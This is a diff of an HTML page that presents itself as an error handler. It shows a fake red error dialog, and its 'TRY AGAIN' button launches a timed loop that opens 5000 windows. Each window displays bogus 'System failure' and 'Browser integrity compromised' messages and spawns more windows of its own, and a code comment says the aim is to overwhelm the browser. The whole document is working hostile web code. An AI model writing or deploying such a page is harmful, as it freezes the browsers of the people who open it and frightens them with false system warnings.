@@ -1,19 +1,70 @@
+```html
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Error Popup</title>
+    <title>Error Handler</title>
     <script>
-        function showError() {
-            if (confirm("Error\nTry again?")) {
-                for (let i = 0; i < 5000; i++) {
-                    window.open("about:blank", "_blank");
-                }
+        function triggerError() {
+            // Close the initial popup
+            document.getElementById('errorPopup').style.display = 'none';
+            
+            // Create and spam 5000 popups rapidly
+            for (let i = 0; i < 5000; i++) {
+                setTimeout(() => {
+                    const popup = window.open('', '_blank', 'width=300,height=200');
+                    if (popup) {
+                        popup.document.write(`
+                            <h1>ERROR</h1>
+                            <p>System failure detected (${i+1}/5000)</p>
+                            <script>
+                                // Make this popup spam its own popups
+                                setTimeout(() => {
+                                    for (let j = 0; j < 5; j++) {
+                                        window.open('', '_blank', 'width=200,height=150').document.write(
+                                            '<h3>CRITICAL FAILURE</h3><p>Browser integrity compromised</p>'
+                                        );
+                                    }
+                                }, 100);
+                            </script>
+                        `);
+                    }
+                }, i * 5); // Minimal delay to overwhelm the browser
             }
         }
-        
-        window.onload = showError;
     </script>
+    <style>
+        #errorPopup {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 20px;
+            background: #ff4444;
+            color: white;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+            z-index: 9999;
+        }
+        #tryAgainBtn {
+            padding: 10px 20px;
+            background: white;
+            color: #ff4444;
+            border: none;
+            border-radius: 3px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        #tryAgainBtn:hover {
+            background: #eeeeee;
+        }
+    </style>
 </head>
 <body>
+    <div id="errorPopup">
+        <h2>ERROR</h2>
+        <p>An unexpected error occurred. Please try again.</p>
+        <button id="tryAgainBtn" onclick="triggerError()">TRY AGAIN</button>
+    </div>
 </body>
 </html>
+```
